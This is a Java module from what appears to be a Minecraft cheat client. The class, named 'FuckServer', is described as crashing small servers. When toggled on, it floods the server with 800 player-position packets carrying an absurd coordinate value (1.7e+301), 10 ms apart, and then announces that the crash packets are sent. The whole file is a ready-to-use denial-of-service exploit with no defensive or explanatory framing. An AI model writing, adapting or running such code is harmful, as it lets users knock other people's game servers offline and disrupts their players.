package genshin.pion.Pion.modules.world;

import genshin.pion.Manager.ModuleManager;
import genshin.pion.Pion.ModuleType;
import genshin.pion.Pion.modules.Module;
import genshin.pion.Pion.utils.Helper;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C03PacketPlayer;
import org.lwjgl.input.Keyboard;

public class FuckServer extends Module {
    public FuckServer() {
        super("FuckServer", Keyboard.KEY_NONE, ModuleType.World,"send packet make server shutdown (work on small server only)");
        Chinese="崩服务器";
    }

    @Override
    public void enable(){
        ServerFucker Fucker = new ServerFucker();
        Fucker.start();
        Helper.sendMessage("Fucking, Please wait...");
        super.enable();
    }

    class ServerFucker extends Thread{
        @Override
        public void run(){
            int i = 0;
            while (i < 800) {
                Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(1.7e+301,-999.0,0.0,true));
                i = i + 1;
                try {
                    Thread.sleep(10);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            Helper.sendMessage("Server Crash Packet Send done.");
            ModuleManager.getModule("FuckServer").setState(false);
        }
    }
}
